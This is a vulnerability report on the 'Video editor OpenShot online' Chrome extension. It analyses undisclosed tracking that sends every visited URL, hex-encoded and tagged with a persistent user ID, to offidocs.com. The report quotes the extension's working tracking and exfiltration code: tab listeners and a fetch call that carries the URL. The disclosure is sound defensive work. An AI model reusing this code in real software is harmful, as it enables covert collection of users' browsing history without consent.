# Vulnerability Report: Video editor OpenShot online

## Metadata
- **Extension ID**: kdfinbdncekfhibpbnkjedmdofkjghjj
- **Extension Name**: Video editor OpenShot online
- **Version**: 2.3.6
- **Users**: ~60,000
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

This Chrome extension claims to provide video editing capabilities through OpenShot online, but contains undisclosed tracking functionality that monitors and exfiltrates all browsing activity to offidocs.com servers. The extension automatically tracks every URL the user visits across all tabs (excluding offidocs.com itself) and sends this data to a remote server along with a persistent unique user identifier. While the extension's primary functionality of integrating with the offidocs.com video editor appears legitimate, the comprehensive browsing history collection occurs silently in the background without clear disclosure to users, representing a significant privacy concern.

The extension generates or retrieves a unique username stored in chrome.storage and transmits visited URLs (hex-encoded) to `checkdownloadopenshotx_2_nav.php` endpoint. This tracking behavior is enabled by default and controlled through an undisclosed "offidocscloud" toggle in the popup interface.

## Vulnerability Details

### 1. HIGH: Undisclosed Browsing History Collection and Exfiltration

**Severity**: HIGH
**Files**: websecure.js, service_worker.js
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**: The extension implements comprehensive browsing activity tracking that captures every URL visited by the user and transmits it to offidocs.com servers. This occurs automatically in the background service worker without explicit user consent or clear disclosure.

**Evidence**:

The service worker initializes tracking on all tab activations and updates:
```javascript
function websecure() {
    this.init = function () {
        chrome.tabs.onActivated.addListener(function(activeInfo) {
                activeTabId = activeInfo.tabId;
                getTabInfo(activeTabId);
        });

        chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
                getTabInfo(tabId);
        });
    };
}
```

The `getTabInfo` function extracts URLs from all tabs except offidocs.com:
```javascript
function getTabInfo(tabId) {
      chrome.tabs.get(tabId, function(tab) {
            if ( ( tab.url.indexOf("offidocs") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lastUrl != tab.url) )  {
                    urlx =  tab.url;
                    extractvideo(urlx);
                    lastUrl = tab.url;
            }
      });
}
```

URLs are hex-encoded and transmitted along with a unique user identifier:
```javascript
async function extractvideo(urlxx) {
    // Retrieves or generates unique username
    let storageResult = await chrome.storage.local.get([offidocs_key]);
    if (offidocs_key in storageResult) {
        datax = storageResult[offidocs_key]
    }

    var un = username;
    if ( datax.offidocscloud == "0")
        return;

    // Sends visited URL to server
    let responsecheck = await fetch('https://www.offidocs.com/media/system/app/checkdownloadopenshotx_2_nav.php?filepath=' + bin2hex(urlxx) + '&hex=1&u=' + un);
}
```

**Verdict**: This constitutes undisclosed data exfiltration. While the stated purpose is to detect video files for editing, the blanket collection of all visited URLs goes beyond this legitimate use case. The privacy policy should clearly disclose this tracking behavior, and users should have explicit opt-in consent. The fact that this is controlled by an undocumented "offidocscloud" toggle (default enabled) rather than prominent user consent makes this a HIGH severity privacy violation.

### 2. HIGH: Persistent User Tracking with Unique Identifier

**Severity**: HIGH
**Files**: websecure.js, popup.js
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**: The extension generates a unique 10-character identifier for each user and persistently associates all browsing activity with this identifier. This enables cross-session tracking and profiling of user behavior.

**Evidence**:

Username generation and storage:
```javascript
if ( chrome.storage.sync.get('username', function (obj) { })  ) {
    username = chrome.storage.sync.get('username', function (obj) { });
}
else {
   username = "" + randomString(10) + "".toLowerCase();
   chrome.storage.sync.set({'username': username.toLowerCase()}, function() { });
}
```

The identifier is stored in both `chrome.storage.sync` and `chrome.storage.local` and transmitted with every URL:
```javascript
let responsecheck = await fetch('https://www.offidocs.com/media/system/app/checkdownloadopenshotx_2_nav.php?filepath=' + bin2hex(urlxx) + '&hex=1&u=' + un);
```

**Verdict**: The use of persistent unique identifiers combined with comprehensive URL tracking enables long-term user profiling. This identifier follows the user across browser restarts and is transmitted with every single URL visited. While legitimate analytics might justify some form of session tracking, the combination of persistent IDs with full browsing history creates a significant privacy risk that should be clearly disclosed.

## False Positives Analysis

The following patterns were observed but are considered legitimate for this extension type:

1. **Communication with offidocs.com**: The extension's core functionality is to integrate with the offidocs.com web service for video editing, so network communication with this domain is expected and legitimate.

2. **File Manager Interface**: The popup.js includes extensive code for an elfinder file manager interface connecting to offidocs.com servers. This is consistent with the extension's stated purpose of managing and editing video files.

3. **iframe Embedding**: The extension creates iframes pointing to offidocs.com editing interfaces, which is appropriate for a web-based video editor integration.

4. **Storage of User Preferences**: Storing the "offidocscloud" preference flag is legitimate configuration management.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| www.offidocs.com/media/system/app/checkdownloadopenshotx_2_nav.php | Video file detection / URL tracking | Hex-encoded URL, unique user ID | HIGH - Receives all visited URLs |
| www.offidocs.com/media/system/app/checkdownloadopenshotr_2_nav.php | List detected files | Unique user ID | MEDIUM - Retrieves tracked URLs |
| www.offidocs.com/media/system/app/view_edit_openshot_nav.php | Open video editor | Username, filepath | LOW - Legitimate functionality |
| www.offidocs.com/media/system/app/resetlool.php | Account/session management | Username | LOW - Legitimate functionality |
| www.offidocs.com/phpextensions/connector.php | File manager backend | Username, service ID | LOW - Legitimate functionality |

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**: While the extension provides legitimate video editing functionality through integration with offidocs.com, it contains undisclosed tracking code that monitors and exfiltrates comprehensive browsing history. The combination of:

1. **Blanket URL Collection**: Every URL visited across all tabs (except offidocs.com) is captured
2. **Persistent User Identification**: A unique 10-character ID tracks users across sessions
3. **Automatic Background Exfiltration**: Data is sent to remote servers without user interaction
4. **Lack of Clear Disclosure**: The tracking is enabled by default with no prominent opt-in consent
5. **Scope Exceeds Stated Purpose**: While ostensibly for "detecting video files," the implementation captures all web activity

This behavior represents a significant privacy violation under CWE-359. The extension operates with ~60,000 users, meaning tens of thousands of users' browsing activities may be collected without their knowledge.

**Recommendation**: The extension should:
- Clearly disclose browsing history collection in the privacy policy and installation flow
- Implement opt-in consent before any tracking begins
- Limit URL collection to specific file extensions or content-types relevant to video editing
- Provide users with clear controls to view, delete, and opt-out of tracking
- Consider whether such extensive tracking is necessary for the stated functionality

Without these changes, the extension poses a HIGH privacy risk to users and may violate Chrome Web Store policies regarding user data collection and disclosure.
